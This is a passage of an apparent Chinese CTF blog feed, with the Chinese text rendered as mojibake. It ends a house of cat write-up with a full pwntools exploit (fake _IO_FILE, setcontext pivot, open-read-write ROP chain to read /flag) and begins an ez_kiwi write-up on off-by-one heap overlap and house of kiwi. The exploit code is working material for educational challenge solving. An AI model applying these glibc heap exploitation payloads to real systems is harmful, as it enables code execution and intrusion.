class="hljs-number">25</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0xe0</span>]<br><span class="hljs-number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">37</span>&gt;    <span class="hljs-keyword">call</span>   <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x18</span>]<br></code></pre></td></tr></table></figure><p>åŠ«æŒåˆ°_IO_wfile_jumpsï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><img src="/img/2/1667369851498.jpg" style="zoom: 67%;" /><p>_IO_switch_to_wget_modeå‡½æ•°ä¸­å…·ä½“å®ç°ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><img src="/img/2/1667370258241.jpg" style="zoom: 67%;" /><p>åœ¨è¿™è¿‡ç¨‹ä¸­rdiå¯„å­˜å™¨å§‹ç»ˆæ˜¯<code>_IO_2_1_stdout_</code>çš„åœ°å€ï¼Œ è®©å…¶æœ€åæ‰§è¡Œï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">8</span>] <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">call</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span> + <span class="hljs-number">0x20</span>]<br></code></pre></td></tr></table></figure><p>é€šè¿‡rdiçš„å€¼å»æ§åˆ¶rdxï¼Œå¹¶å»æ‰§è¡Œæˆ‘ä»¬æŒ‡å®šçš„å‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬æ˜¯å»æ‰§è¡Œsetcontext åŠ«æŒrspå¯„å­˜å™¨æŒ‡å‘å †åœ°å€ã€‚</p><p>æ”¹å†™<code>_IO_2_1_stdout_</code>æ„é€ å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br></code></pre></td></tr></table></figure><h5 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h5><p>å†™å…¥å †ä¸­çš„æ•°æ®è¦æ³¨æ„setcontextçš„æ‰§è¡Œ ä¸orwä¸­gadgetçš„ä½ç½®ï¼Œå…·ä½“æ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br></code></pre></td></tr></table></figure><p>å®Œæ•´çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25381</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Any data?&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>IO_2_1_stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>IO_wfile_jumps = libcbase + <span class="hljs-number">0x1e8de0</span><br>magic_gadget = libcbase + <span class="hljs-number">0x151990</span><br><span class="hljs-comment">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>pop_rax = libcbase + <span class="hljs-number">0x36174</span><br>ret = libcbase + <span class="hljs-number">0x22679</span><br>syscall_ret = libcbase + <span class="hljs-number">0x630a9</span><br>setcontext = libcbase + <span class="hljs-number">347936</span><br>mp = libcbase + <span class="hljs-number">2015944</span><br><br>add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-comment">#print(hex(heap_addr))</span><br>orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br>edit(<span class="hljs-number">0</span>, payload)<br><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(-<span class="hljs-number">8</span>).encode())<br><br>p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, fake_IO_FILE)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹                                                                                         </p><p>å…³äºhouse of catæˆ‘æ²¡æœ‰è®²çš„å¤ªè¯¦ç»†ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒçœ‹é›ªå¤§ä½¬çš„è¿™ç¯‡æ–‡ç« <a href="https://bbs.pediy.com/thread-273895.htm">https://bbs.pediy.com/thread-273895.htm</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Dest0g3 520è¿æ–°èµ› pwn ez_kiwi</title>
    <link href="/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/"/>
    <url>/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/</url>
    
    <content type="html"><![CDATA[<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>é¢˜ç›®ç¯å¢ƒï¼šglibc-2.31</p><p>å¦‚å›¾åœ¨editçš„è¿‡ç¨‹ä¸­å¯¹é‡æ–°è¾“å…¥çš„å­—ç¬¦é•¿åº¦æœªæœ‰æ•ˆæ£€æŸ¥ï¼Œé€ æˆå•å­—èŠ‚æº¢å‡ºã€‚</p><p><img src="/img/1/1.png"></p><p> è¿™æ—¶æˆ‘ä»¬å°±å¯åˆ©ç”¨è¿™ä¸€æ¼æ´è®©å †å—é‡å ï¼Œä»è€Œæ³„æ¼libcçš„åœ°å€</p><p>æ³„æ¼libcçš„åœ°å€é¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯unsorted binä¸­çš„main_arenaï¼Œç”±äºå­˜åœ¨tcacheï¼Œå¿…é¡»é‡Šæ”¾8ä¸ªå¤§å°ç›¸åŒæ‰ä¼šè¿›å…¥unsorted binï¼›åœ¨addçš„è¿‡ç¨‹ä¸­è¾“å…¥çš„idxå¯ä»¥å°äº0xfï¼Œä½†å®é™…ä¸Šè¶…è¿‡9å°±æ— æ³•æ­£å¸¸ç”³è¯·ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç”³è¯·é‡Šæ”¾æ—¶è¦å°å¿ƒå †å—ä¸å¤Ÿå’Œtop chunkçš„åˆå¹¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):          <br> Â  Â add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#é‡å çš„å †å—</span><br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#å…ˆé‡Šæ”¾è¿›å…¥tcacheï¼Œä¸ä¼štop chunkçš„åˆå¹¶</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br> Â  Â delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å°±å¯ä»¥å¾—åˆ°libcçš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä¼šä¿®æ”¹tcacheçš„fdæŒ‡é’ˆï¼ŒæŒ‡å‘<code>__malloc_hook</code>å’Œ<code>__free_hook</code>,å†æ¬¡ç”³è¯·æ—¶å°±ä½¿ç”¨systemæˆ–è€…one_gadgetå»å¡«å……è¯¥åœ°å€ã€‚ä½†æ˜¯è¿™é¢˜æ•…æ„ä¸è®©ä½ å»è¿™æ ·å»ä½¿ç”¨ï¼Œæ¯æ¬¡é‡æ–°å¼€å§‹å¾ªç¯æ—¶ä¼šè°ƒç”¨clearå‡½æ•°å°†<code>__malloc_hook</code>å’Œ<code>__free_hook</code>å…¨éƒ¨é‡ç½®ä¸º0ã€‚</p><img src="/img/1/2.png"  /><p><img src="/img/1/3.png"></p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>è¿™æ—¶æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨house of kiwiè¿™ç§æ–¹å¼ï¼Œä¿®æ”¹<code>_IO_file_sync</code>å’Œ<code>_IO_helper_jumps</code>ä¸­çš„å€¼ã€‚</p><p>å…·ä½“è¿‡ç¨‹ä¾¿æ˜¯è§¦å‘<code>__malloc_assert</code>åï¼Œå»æ‰§è¡Œfflush (stderr)ï¼Œä¼šä½¿ç”¨<code>_IO_file_jumps</code>ä¸­çš„<code>_IO_file_sync</code>ï¼ŒRDXå¯„å­˜å™¨çš„å€¼ä¸º<code>IO_helper_jumps</code>æŒ‡é’ˆ,RDXå§‹ç»ˆæ˜¯ä¸€ä¸ªå›ºå®šçš„åœ°å€ã€‚</p><img src="/img/1/5.png"><p>ç„¶å<strong>é€šè¿‡ setcontext æ§åˆ¶å¯„å­˜å™¨çš„å€¼</strong>ã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; disassemble setcontext<br>   <span class="hljs-number">0x00007f38b563d0dd</span> &lt;+<span class="hljs-number">61</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa0</span>]#åˆ©ç”¨ä»£ç <br>   <span class="hljs-number">0x00007f38b563d0e4</span> &lt;+<span class="hljs-number">68</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x00007f38b563d0eb</span> &lt;+<span class="hljs-number">75</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0x00007f38b563d0ef</span> &lt;+<span class="hljs-number">79</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x48</span>]<br>   <span class="hljs-number">0x00007f38b563d0f3</span> &lt;+<span class="hljs-number">83</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x50</span>]<br>   <span class="hljs-number">0x00007f38b563d0f7</span> &lt;+<span class="hljs-number">87</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x58</span>]<br>   <span class="hljs-number">0x00007f38b563d0fb</span> &lt;+<span class="hljs-number">91</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x00007f38b563d0ff</span> &lt;+<span class="hljs-number">95</span>&gt;:    <span class="hljs-keyword">test</span>   <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x48</span>,<span class="hljs-number">0x2</span><br>   <span class="hljs-number">0x00007f38b563d10b</span> &lt;+<span class="hljs-number">107</span>&gt;:   <span class="hljs-keyword">je</span>     <span class="hljs-number">0x7f38b563d1c6</span> &lt;setcontext+<span class="hljs-number">294</span>&gt;<br>   â€¦â€¦â€¦â€¦<br>   â€¦â€¦â€¦â€¦<br>   <span class="hljs-number">0x00007f38b563d1c6</span> &lt;+<span class="hljs-number">294</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa8</span>]#åˆ©ç”¨ä»£ç <br>   <span class="hljs-number">0x00007f38b563d1cd</span> &lt;+<span class="hljs-number">301</span>&gt;:   <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0x00007f38b563d1ce</span> &lt;+<span class="hljs-number">302</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x00007f38b563d1d2</span> &lt;+<span class="hljs-number">306</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x68</span>]<br>   <span class="hljs-number">0x00007f38b563d1d6</span> &lt;+<span class="hljs-number">310</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x98</span>]<br>   <span class="hljs-number">0x00007f38b563d1dd</span> &lt;+<span class="hljs-number">317</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x28</span>]<br>   <span class="hljs-number">0x00007f38b563d1e1</span> &lt;+<span class="hljs-number">321</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x30</span>]<br>   <span class="hljs-number">0x00007f38b563d1e5</span> &lt;+<span class="hljs-number">325</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x88</span>]<br>   <span class="hljs-number">0x00007f38b563d1ec</span> &lt;+<span class="hljs-number">332</span>&gt;:   <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00007f38b563d1ee</span> &lt;+<span class="hljs-number">334</span>&gt;:   <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>è®¾ç½®<code>rdx + 0xa0</code>æ¥æ§åˆ¶rspï¼Œä¹Ÿå°±æ˜¯æ§åˆ¶äº†æ ˆçš„åœ°å€ï¼Œé€šè¿‡æœ€åçš„retæŒ‡ä»¤å°±å¯ä»¥æ‰§è¡ŒROPã€‚</p><p>æ”»å‡»æµç¨‹å¦‚ä¸‹</p><p>å°†<code>_IO_file_jumps</code>ä¸­çš„<code>_IO_file_sync</code>ä¿®æ”¹ä¸º<code>setcontext + 61</code>çš„åœ°å€ï¼Œè®©ç¨‹åºæ‰§è¡Œsetcontextä¸­çš„ä»£ç ï¼›åŒæ—¶ä¿®æ”¹<code>_IO_helper_jumps + 0xa0 å’Œ _IO_helper_jumps + 0xa8</code>åˆ†åˆ«å­˜æ”¾æœ‰ROPçš„ä½ç½®å’ŒretæŒ‡ä»¤çš„gadgetä½ç½®ã€‚é¢˜ç›®æä¾›äº†libcæ–‡ä»¶ï¼Œåªéœ€åœ¨libcä¸­æ‰¾åˆ°ç›¸åº”çš„gadgetå†åŠ ä¸Šlibcçš„åŸºåœ°å€å³å¯ï¼Œå¯ä»¥é€šè¿‡æ³„æ¼å †çš„åœ°å€æ¥å­˜æ”¾gadgetã€‚</p><h3 